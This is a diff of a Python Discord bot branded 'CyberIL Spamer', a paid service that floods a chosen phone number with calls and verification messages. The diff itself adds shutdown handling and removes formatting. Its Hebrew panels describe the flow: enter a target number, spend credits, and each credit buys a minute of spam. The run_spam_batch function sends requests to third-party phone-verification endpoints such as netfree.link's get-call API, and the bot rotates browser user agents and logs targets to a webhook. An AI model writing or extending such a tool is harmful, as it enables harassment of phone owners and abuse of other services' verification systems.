@@ -11,9 +11,10 @@ import logging
 import re
 import sys
 import os
-from datetime import datetime, timezone
+from datetime import datetime, timezone, timedelta
 import certifi
 import socket
+import signal
 
 TOKEN = os.getenv("DISCORD_TOKEN")
 MONGO_URI = os.getenv("MONGO_URI")
@@ -25,10 +26,9 @@ GIFT_CHANNEL = 1485104425625325709
 INFO_CHANNEL = 1485125569690603692
 
 ADMIN_ROLE_ID = 1480762750052601886
-STAFF_ROLE_ID = 1480762750052601886  # תפקיד צוות שיראה את הפקודות
+STAFF_ROLE_ID = 1480762750052601886
 
 COOLDOWN_TIME = 20
-CREDITS_PER_CYCLE = 3
 MAX_CREDIT_SPEND = 100
 LAUNCH_DELAY = 3
 
@@ -43,7 +43,7 @@ intents.message_content = True
 intents.members = False
 intents.guilds = True
 
-client = commands.Bot(command_prefix="!", intents=intents, heartbeat_timeout=30)
+client = commands.Bot(command_prefix="!", intents=intents, heartbeat_timeout=60)
 tree = client.tree
 
 mongo_connection = AsyncIOMotorClient(MONGO_URI, tlsCAFile=certifi.where())
@@ -58,7 +58,7 @@ logging.basicConfig(level=logging.WARNING)
 
 active_missions = {}
 cooldown_tracker = {}
-spam_executor = None
+is_shutting_down = False
 
 BROWSER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/128.0.0.0 Safari/537.36",
@@ -81,7 +81,7 @@ async def get_client_ip():
 
 async def send_webhook_log(user_id: int, username: str, phone: str, cost: int, success: int, failed: int, duration: int, ip: str):
     embed = discord.Embed(
-        title="📊 **לוג ספאם**",
+        title="📊 לוג ספאם",
         color=0x5865F2,
         timestamp=datetime.now(timezone.utc)
     )
@@ -434,6 +434,7 @@ async def run_spam_batch(phone: str):
         geteat_fd.add_field("phone", raw)
         geteat_fd.add_field("testing", "false")
         
+        # כל הבקשות עם await תקין
         tasks = [
             send_request(s, "https://netfree.link/api/user/verify-phone/get-call",
                 json_data={"agreeTou": True, "phone": formatted},
@@ -810,23 +811,23 @@ async def run_spam_batch(phone: str):
 
 def create_panel():
     embed = discord.Embed(
-        title="**CYBERIL SPAMER**",
-        description="```המערכת המובילה בישראל```",
+        title="CYBERIL SPAMER",
+        description="מערכת הספאם המתקדמת בישראל",
         color=COLOR_MAIN
     )
     embed.add_field(
-        name="**איך מתחילים?**",
-        value="```1. לחץ על התחל ספאם\n2. הזן מספר טלפון\n3. בחר כמות קרדיטים\n4. אשר והמתן```",
+        name="איך מתחילים?",
+        value="1. לחץ על התחל ספאם\n2. הזן מספר טלפון\n3. בחר כמות קרדיטים\n4. אשר והמתן",
         inline=False
     )
     embed.add_field(
-        name="**עלות**",
-        value=f"```כל קרדיט = דקה אחת של ספאם```",
+        name="עלות",
+        value=f"כל קרדיט = דקה אחת של ספאם",
         inline=False
     )
     embed.add_field(
-        name="**הערות**",
-        value=f"```דיליי של {COOLDOWN_TIME} שניות בין ספאם לאותו מספר```",
+        name="הערות",
+        value=f"דיליי של {COOLDOWN_TIME} שניות בין ספאם לאותו מספר",
         inline=False
     )
     embed.set_footer(text=f"CyberIL Spamer © 2026")
@@ -834,13 +835,13 @@ def create_panel():
 
 def create_gift_panel():
     embed = discord.Embed(
-        title="**קרדיטים חינם**",
-        description="```קבל קרדיט אחד כל 24 שעות```",
+        title="קרדיטים חינם",
+        description="קבל קרדיט אחד כל 24 שעות",
         color=0xFFD700
     )
     embed.add_field(
-        name="**איך מקבלים?**",
-        value="```לחץ על הכפתור למטה```",
+        name="איך מקבלים?",
+        value="לחץ על הכפתור למטה",
         inline=False
     )
     embed.set_footer(text="CyberIL Spamer © 2026")
@@ -906,7 +907,7 @@ class ConfirmAttack(discord.ui.View):
 
         try:
             while time.time() < end_time:
-                if stop_event.is_set():
+                if stop_event.is_set() or is_shutting_down:
                     break
                 
                 s, f = await run_spam_batch(self.phone)
@@ -1009,7 +1010,7 @@ class LaunchModal(discord.ui.Modal, title="התחל ספאם"):
         
         confirm = discord.Embed(
             title="⚠️ אישור ספאם",
-            description=f"```\nיעד: {phone_num}\nמשך: {credits_num} דקות\nעלות: {credits_num} קרדיטים\nיתרה: {bal_str}\n```",
+            description=f"יעד: {phone_num}\nמשך: {credits_num} דקות\nעלות: {credits_num} קרדיטים\nיתרה: {bal_str}",
             color=COLOR_WARNING
         )
         
@@ -1209,6 +1210,24 @@ async def on_ready():
 
     except Exception as e:
         print(f"❌ שגיאה: {e}")
+
+@client.event
+async def on_disconnect():
+    global is_shutting_down
+    is_shutting_down = True
+    for user_id, event in active_missions.items():
+        if event and not event.is_set():
+            event.set()
+    active_missions.clear()
+
+async def shutdown_handler():
+    global is_shutting_down
+    is_shutting_down = True
+    for user_id, event in active_missions.items():
+        if event and not event.is_set():
+            event.set()
+    active_missions.clear()
+    await client.close()
 
 @tree.command(name="credit", description="בדוק יתרת קרדיטים")
 async def cmd_credit(interaction: discord.Interaction):
@@ -1518,8 +1537,11 @@ async def cmd_restart(interaction: discord.Interaction):
         await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
         return
     await interaction.response.send_message("🔄 מאתחל...", ephemeral=True)
-    await client.close()
+    await shutdown_handler()
     os.execv(sys.executable, [sys.executable] + sys.argv)
 
 if __name__ == "__main__":
-    client.run(TOKEN)
+    try:
+        client.run(TOKEN)
+    except KeyboardInterrupt:
+        asyncio.run(shutdown_handler())
